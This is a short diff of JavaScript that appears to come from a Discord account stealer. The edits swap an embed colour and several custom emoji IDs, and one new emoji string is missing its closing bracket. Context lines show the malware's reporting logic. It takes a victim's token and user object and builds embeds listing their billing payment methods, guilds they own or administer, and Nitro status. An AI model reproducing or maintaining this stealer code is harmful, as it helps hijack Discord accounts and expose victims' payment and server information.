@@ -291,7 +291,7 @@ const notify = async (ctx, token, user) => {
     });
 
     ctx.embeds.forEach(embed => {
-        embed.color = 12740607;
+        embed.color = 2550000;
         embed.author = {
             name: `${user.username} | ${user.id}`,
             icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
@@ -469,8 +469,8 @@ class GetDataUser {
         const data = await API.Billing();
 
         const payment = {
-            1: '<:Card:1353315910563139594>',
-            2: '<:Paypal:1346174065538367541>'
+            1: '<:Card:1353474708858998886',
+            2: '<:Paypal:1353474733542477934>'
         };
         let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
         return paymentMethods || '❓';
@@ -540,8 +540,8 @@ class GetDataUser {
                 : 'No Invite';
 
             const emoji = guild.owner
-                ? `<:Owner:963333541343686696> Owner`
-                : `<:Staff:1136740017822253176> Admin`;
+                ? `<:black_owner_badge:1353475168764297338> Owner`
+                : `<:sd:1353475327564841120> Admin`;
             const members = `Members: \`${guild.member_count}\``;
             const name = `**${guild.name}** - (${guild.id})`;
 
@@ -573,7 +573,7 @@ class GetDataUser {
 
     Nitro = (flags) => {
         const { premium_type, premium_guild_since } = flags,
-            nitro = "<:DiscordNitro:587201513873473542>";
+            nitro = "<:NitroBoost:1353476571129974845>";
         switch (premium_type) {
             default:
                 return "❓";
